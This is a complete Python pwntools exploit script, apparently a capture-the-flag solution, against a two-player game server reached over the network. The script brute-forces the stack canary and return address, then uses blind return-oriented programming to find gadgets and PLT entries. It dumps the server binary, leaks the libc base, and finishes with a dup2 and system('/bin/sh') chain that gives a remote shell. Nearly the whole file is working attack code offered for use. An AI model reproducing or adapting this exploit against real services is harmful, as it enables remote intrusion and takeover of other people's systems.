#!/usr/bin/python3
from pwn import *
from tqdm import trange
from sys import argv

HOST = argv[1] if len(argv) >= 2  else "localhost"
PORT = int(argv[2]) if len(argv) >= 3 else 1234

context.update(os='linux', arch='amd64')

LOBBY_BLANK = 0xffffffff

BUY_UNIT = 0x10
OPPO_BUY_UNIT = 0x11
TICK_UPDATE = 0x1f
FORFEIT = 0x32
VICTORY_BY_FORFEIT = 0x33
DEFEAT_BY_FORFEIT = 0x34
GAME_START = 0x3f

def recv_packet(p:remote) -> bytes:
    size = u16(p.recvn(2))
    packet = p.recvn(size)
    return packet

def send_packet_A(p: remote, size:int, ptype:int):
    payload = p16(size) + p16(ptype)
    payload += (size -2)*b"A"
    p.send(payload)

def send_packet(p:remote, payload:bytes):
    payload = p16(len(payload)) + payload
    p.send(payload)

def buy_unit(p:remote, unit_type: int):
    payload = p16(BUY_UNIT) + p16(unit_type)
    send_packet(p, payload)

def buy_unit_A(p: remote, size:int, unit_type:int):
    payload = p16(size) + p16(BUY_UNIT) + p16(unit_type)
    payload += (size-4)*b"A"
    p.send(payload)

def forfeit(p:remote):
    send_packet(p, p16(FORFEIT))

def start() -> tuple[remote]:
    p0 = remote(HOST, PORT)
    p0.send(p32(LOBBY_BLANK))
    lobby = u32(p0.recvn(4))
    p1 = remote(HOST, PORT)
    p1.send(p32(lobby))
    assert p0.recvn(4) == p32(lobby)
    assert recv_packet(p0) == p16(GAME_START)
    assert p1.recvn(4) == p32(lobby)
    assert recv_packet(p1) == p16(GAME_START)
    return (p0, p1)

def find_buf_length(use_forfeit=False) -> int:
    """
    bf the length of the stack buffer, until the canary is reached
    if use_forfeit is True, we use forfeit_packets -> need to wait for the next tick, but closes the connection properly
    """
    l = 4
    while True:
        p0, p1 = start()
        try:
            if use_forfeit:
                send_packet_A(p0, l, FORFEIT)
                resp = recv_packet(p0)
                assert resp == p16(DEFEAT_BY_FORFEIT)
            else:
                buy_unit_A(p0, l, 1)
                resp = recv_packet(p1)
                assert resp == p16(OPPO_BUY_UNIT) + p16(1)
            p0.close()
            forfeit(p1) #properly close the remote, to anticipate the timeout for lack of ping
            p1.close()
            l += 1
        except EOFError:
            p0.close()
            forfeit(p1)
            p1.close()
            break
        except AssertionError:
            if resp != b"":
                print(f"Unexpected response:  {resp}")
            p0.close()
            forfeit(p1)
            p1.close()
            break

    return l-1

#BUF_LEN = find_buf_length()
BUF_LEN = 40
log.info(f"Buf length: {BUF_LEN} (shouldn't change across reboots")

def bf_stack(prefix:bytes, depth:int, only_find_fit=True, ignore_tick_update=True):
    """stack reading by bf byte by byte"""
    st = list(prefix)
    for pos in range(len(prefix), len(prefix) + depth):
        b = None
        for i in trange(256):
            try:
                context.log_level = "ERROR"
                p0, p1 = start()
                send_packet(p0, p16(BUY_UNIT) + p16(1) + b"a"*(BUF_LEN-4) + bytes(st + [i]))
                p0.close()
                resp = recv_packet(p1)
                if resp != p16(OPPO_BUY_UNIT) + p16(1):
                    forfeit(p1)
                    p1.close()
                    if not only_find_fit:
                        if not ignore_tick_update or resp[:2] != p16(TICK_UPDATE): #are sent every second anyway
                            context.log_level = "INFO"
                            log.info(f"Interesting result for {hex(i)} at pos {pos}: {resp}")
                    continue
                forfeit(p1)
                p1.close()
                b = i
                if only_find_fit:
                    break
                context.log_level = "INFO"
                log.info(f"Possible byte {hex(b)} at pos {pos}")
            except EOFError:
                forfeit(p1)
                p1.close()
        context.log_level = "INFO"
        if b is None:
            log.info(f"Bf aborted at index {pos}")
            break
        log.info(f"Selected byte {hex(b)} at pos {pos}")
        st.append(b)
    return bytes(st)

def bf_stack_faster():
    """
    use analysis from the first stack reading to accelerate the process for the next ones
    """
    #canary  + zeroes + rbx + zeroes
    stack = bf_stack([], 24)
    stack += p64(0)
    #return addr
    stack += b"\x0b"
    stack = bf_stack(stack, 2)
    stack += stack[19:24]
    return stack

def test(payload:bytes):
    context.log_level = "DEBUG"
    p0, p1 = start()
    send_packet(p0, payload)
    p1.recvall()
    p0.recvall()

#STACK = bf_stack([], 40)
#STACK = bf_stack_faster()
STACK = b'\x00\xe0\xa7\xbakR\xc73\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1b\xfb]b\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0b\n\x1b\xfb]b\x00\x00'
assert(len(STACK) == 40)
# #Contains: canary, ???, rbx (we are not supposed to know it, but holds the mutex address), rbp (can be nulled, crash comes after), rip
#note: one could believe that the second value is rbp, the next one rip
#but some tests show that there are many possible values for the third one (including the page aligned one), so can't be rip
#pushing further shows that the fifth value does not have that many candidate values, and is a few pages before the third one
log.info("Stack reading result (changes across reboot, redo stack reading if what you see is inconsistent):")
log.info(str(STACK))
log.info([hex(u64(STACK[i:i+8])) for i in range(0, 40, 8)])
RETURN_ADDR = u64(STACK[32:40])
CANARY = STACK[:8]
PAYLOAD_BASE = p16(BUY_UNIT) + p16(1) + b"a"*(BUF_LEN-4) + CANARY + 3*p64(0)

#got the following values, should not change
NORMAL_RET_OFF = 0xa0b # RETURN_ADDR & 0xfff
TEXT_BASE = RETURN_ADDR - NORMAL_RET_OFF

log.info(f"Canary: {CANARY} ({CANARY.hex()})")
log.info(f".text base: {TEXT_BASE:#0x}")


#explore what other return addresses give
#bf_stack(STACK[:32], 1, only_find_fit=False)
#bf_stack(STACK[:16] + 2*p64(0), 1, only_find_fit=False, ignore_tick_update=False)
#found with a messed up rbp and rbx, actually many candidates
#There were many other candidates
TICK = TEXT_BASE + 0xaec

TRAP = 0xdeadbeefcafebabe

#now, we want to find a brop gadget
#they look like this:
"""
0:  5b                      pop    rbx
1:  5d                      pop    rbp
2:  41 5c                   pop    r12
4:  41 5d                   pop    r13
6:  41 5e                   pop    r14
8:  41 5f                   pop    r15
a:  c3                      ret 
"""

def find_brop_gadget(off_start=0, off_end=0x1000):
    """
    Tries to find the BROP gadget: 6 pops followed by ret
    """
    for addr in trange(TEXT_BASE + off_start, TEXT_BASE + off_end):
        #tries first a payload that will tick on a brop gadget
        payload = p64(addr) + 6*p64(TRAP) + p64(TICK) + p64(TRAP)
        context.log_level = "ERROR"
        p0, p1 = start()
        send_packet(p0,PAYLOAD_BASE  + payload)
        p0.close()
        try:
            resp = p1.recvn(4, timeout=2)
            forfeit(p1)
            p1.close()
            if len(resp) != 4:
                continue
            if resp[2:4] == p16(TICK_UPDATE):
                #we potentially have a BROP gadget
                #many gadgets reach this point, let's skim out the false positive by giving a payload that will trap on the brop gadget
                payload = p64(addr) + 6*p64(TRAP) + p64(TRAP) + p64(TRAP)
                p0, p1 = start()
                send_packet(p0, PAYLOAD_BASE + payload)
                p0.close()
                try:
                    resp = p1.recvn(4, timeout=2)
                    forfeit(p1)
                    p1.close()
                    if len(resp) == 0:
                        raise EOFError
                    #it was a False positive
                except EOFError:
                    context.log_level = "INFO"
                    log.info(f"Found potential BROP gadget @ {hex(addr)}")
        except EOFError:
            forfeit(p1)
            p1.close()

#find_brop_gadget()
#exit()
#Found gadgets at 0x59b, 0xdea

def check_addr_behaviour(payloads_tick:list[bytes], payloads_trap:list[bytes]) -> bool:
    context.log_level = "ERROR"
    for payload in payloads_tick:
        p0, p1 = start()
        send_packet(p0, PAYLOAD_BASE + payload)
        p0.close()
        try:
            resp = p1.recvn(4, timeout=2)
            forfeit(p1)
            p1.close()
            if len(resp) != 4:
                return False
            if resp[2:4] != p16(TICK_UPDATE):
                return False
        except EOFError:
            forfeit(p1)
            p1.close()
            return False
    for payload in payloads_trap:
        p0, p1 = start()
        send_packet(p0,  PAYLOAD_BASE + payload)
        p0.close()
        try:
            resp = p1.recvn(4, timeout=2)
            forfeit(p1)
            p1.close()
            if len(resp) != 0:
                return False
        except EOFError:
            forfeit(p1)
            p1.close()
    return True

def is_brop_gadget(addr:int) -> bool:
    """
    intensive checks to make sure an address contains a BROP gadget
    """
    payloads_tick = [
        #rbx, rbp, r12, r13, r14, r15
        p64(addr) + 6*p64(TRAP) + p64(TICK) + p64(TRAP),
        #rbp, r12, r13, r14, r15
        p64(addr + 1) + 5*p64(TRAP) + p64(TICK) + p64(TRAP),
        #r12, r13, r14, r15
        p64(addr + 2) + 4*p64(TRAP) + p64(TICK) + p64(TRAP),
        #skip rsp, r13, r14, r15
        #r13, r14, r15
        p64(addr + 4) + 3*p64(TRAP) + p64(TICK) + p64(TRAP),
        #rbp, r14, r15
        p64(addr + 5) + 3*p64(TRAP) + p64(TICK) + p64(TRAP),
        #r14, 15
        p64(addr + 6) + 2*p64(TRAP) + p64(TICK) + p64(TRAP),
        #rsi, r15
        p64(addr + 7) + 2*p64(TRAP) + p64(TICK) + p64(TRAP),
        #r15
        p64(addr + 8) + p64(TRAP) + p64(TICK) + p64(TRAP),
        #rdi
        p64(addr + 9) + p64(TRAP) + p64(TICK) + p64(TRAP),
        #ret
        p64(addr + 10) + p64(TICK) + p64(TRAP),
    ]
    payloads_trap = [
        p64(addr) + 6*p64(TRAP) + p64(TRAP) + p64(TRAP),
        p64(addr + 1) + 5*p64(TRAP) + p64(TRAP) + p64(TRAP),
        p64(addr + 2) + 4*p64(TRAP) + p64(TRAP) + p64(TRAP),
        p64(addr + 4) + 3*p64(TRAP) + p64(TRAP) + p64(TRAP),
        p64(addr + 5) + 3*p64(TRAP) + p64(TRAP) + p64(TRAP),
        p64(addr + 6) + 2*p64(TRAP) + p64(TRAP) + p64(TRAP),
        p64(addr + 7) + 2*p64(TRAP) + p64(TRAP) + p64(TRAP),
        p64(addr + 8) + p64(TRAP) + p64(TRAP) + p64(TRAP),
        p64(addr + 9) + p64(TRAP) + p64(TRAP) + p64(TRAP),
        p64(addr + 10) + p64(TRAP) + p64(TRAP),
    ]
    return check_addr_behaviour(payloads_tick, payloads_trap)

#print(is_brop_gadget(TEXT_BASE + 0x59b))
#print(is_brop_gadget(TEXT_BASE + 0xe0a))


BROP_GADGET = TEXT_BASE + 0xe0a
POP_RSI_R15 = BROP_GADGET + 7
POP_RDI = BROP_GADGET + 9
RET = BROP_GADGET + 10

def is_strcmp(addr:int) -> bool:
    readable = TEXT_BASE
    bad = 0x0
    payloads_tick = [
        p64(POP_RDI) + p64(readable) + p64(POP_RSI_R15) + p64(readable) + p64(0) + p64(addr) + p64(TICK),
    ]
    payloads_trap = [
        p64(POP_RDI) + p64(bad) + p64(POP_RSI_R15) + p64(readable) + p64(0) + p64(addr) + p64(TICK),
        p64(POP_RDI) + p64(readable) + p64(POP_RSI_R15) + p64(bad) + p64(0) + p64(addr) + p64(TICK),
        p64(POP_RDI) + p64(bad) + p64(POP_RSI_R15) + p64(bad) + p64(0) + p64(addr) + p64(TICK),
    ]
    return check_addr_behaviour(payloads_tick, payloads_trap)

def find_strcmp():
    """
    Finds strcmp@plt
    Heuristics:
        - plt is close to the beginning of the executable page
        - each plt entry is 16 bytes long and aligned
        - strcmp crashes iff one of the two args is not readable
    """
    for addr in trange(TEXT_BASE, TEXT_BASE + 0x300, 0x10):
        if is_strcmp(addr):
            context.log_level = "INFO"
            log.info(f"Found strcmp candidate @ {hex(addr)}")

#find_strcmp()
STRCMP = TEXT_BASE + 0xc0

def find_write(fd=5):
    """
    Finds write@plt
    Heuristic similar as the previous one
    Problem: find the fd
    Idea: 0=stdin, 1=stdout, 2=stderr, 3=srv socket, 4=p0, 5=p1
    If we are wrong, try again with other fd
    """
    payload_base = PAYLOAD_BASE
    readable = TEXT_BASE
    #set rdx to non zero
    #NOTE: somehow it does not work if the two strings are the same, hence the +1
    payload_base += p64(POP_RDI) + p64(readable+1) + p64(POP_RSI_R15) + p64(readable) + p64(0) + p64(STRCMP)
    #set rsi to address to leak
    payload_base += p64(POP_RSI_R15)
    payload_base += p64(readable)
    #seems like something writes to the stack here, so we make an irrelevant value
    payload_base += p64(0)
    #set rdi to fd
    payload_base += p64(POP_RDI) + p64(fd)
    for addr in trange(TEXT_BASE, TEXT_BASE + 0x300, 0x10):
        context.log_level = "ERROR"
        p0, p1 = start()
        send_packet(p0, payload_base + p64(addr) + p64(TRAP))
        p0.close()
        try:
            resp = p1.recvn(4)
            p1.close()
            if len(resp) == 0:
                raise EOFError
            context.log_level = "INFO"
            log.info(f"Interesting result when probing {hex(addr)}: {resp}")
        except EOFError:
            p1.close()

#find_write()
WRITE = TEXT_BASE + 0x60
FD = 5

def leak_binary():
    """
    Use write@plt to leak the whole binary
    """
    context.log_level = "DEBUG"
    binary = b""
    len_read = -1
    readable = TEXT_BASE
    payload_base = PAYLOAD_BASE
    addr = TEXT_BASE - 0x1000
    #set rdx to non zero
    #NOTE: somehow it does not work if the two strings are the same, hence the +1
    payload_base += p64(POP_RDI) + p64(readable+1) + p64(POP_RSI_R15) + p64(readable) + p64(0) + p64(STRCMP)
    payload_base += p64(POP_RSI_R15)
    payload_tail = p64(0) #NOTE: this one is also tampered, but does not matter
    payload_tail += p64(POP_RDI) + p64(FD)
    payload_tail += p64(WRITE) + p64(TRAP)
    while len_read != 0:
        p0, p1 = start()
        send_packet(p0, payload_base + p64(addr) + payload_tail)
        p0.close()
        resp = p1.recvall()
        p1.close()
        len_read = len(resp)
        binary += resp
        addr += len_read
    with open("server.leak", "wb") as f:
        f.write(binary)
    
#leak_binary()
#opening the binary in iaito gives the name of the functions in the got
#we can thus obtain the addresses of some libc function by reading the GOT in the leak
#We find the corresponding libc on libc.rip: https://libc.rip/download/libc6_2.35-0ubuntu3.6_amd64.so
#we also obtain the addresses of the symboles that interest us:
GOT_PUTCHAR = TEXT_BASE + 0x3ef8
PUTCHAR = 0x82980
DUP2 = 0x115010
SYSTEM = 0x50d70
STR_BIN_SH = 0x1d8678

def leak_libc_base() -> int:
    """
    read got entry for putchar to obtain the libc base
    """
    readable = TEXT_BASE
    payload = PAYLOAD_BASE
    payload += p64(POP_RDI) + p64(readable+1) + p64(POP_RSI_R15) + p64(readable) + p64(0) + p64(STRCMP)
    payload += p64(POP_RSI_R15) + p64(GOT_PUTCHAR) + p64(0)
    payload += p64(POP_RDI) + p64(FD)
    payload += p64(WRITE) + p64(TRAP)
    p0, p1 = start()
    send_packet(p0, payload)
    p0.close()
    resp = p1.recvn(8)
    libc_base = u64(resp) - PUTCHAR
    return libc_base

LIBC_BASE = leak_libc_base()
# LIBC_BASE = 0x7fb7cb36c000
context.log_level = "INFO"
log.info(f"Found libc base @ {hex(LIBC_BASE)} (change across reboots")

def attack():
    """
    obtain a shell by dup2 and system
    """
    payload = PAYLOAD_BASE
    for i in range(3):
        payload += p64(POP_RSI_R15) + p64(i)
        payload += p64(0) #NOTE: this one get overwritten in the second dup2
        payload += p64(POP_RDI) + p64(FD)
        payload += p64(LIBC_BASE + DUP2)
    payload += p64(POP_RDI)
    payload += p64(LIBC_BASE + STR_BIN_SH)
    payload += p64(RET) #classical alignment problem?
    payload += p64(LIBC_BASE + SYSTEM)
    p0, p1 = start()
    send_packet(p0, payload)
    p0.close()
    log.info("Sleeping for 10 seconds...")
    sleep(10)
    p1.sendline(b"/bin/sh")
    p1.interactive()
    p1.close()

attack()
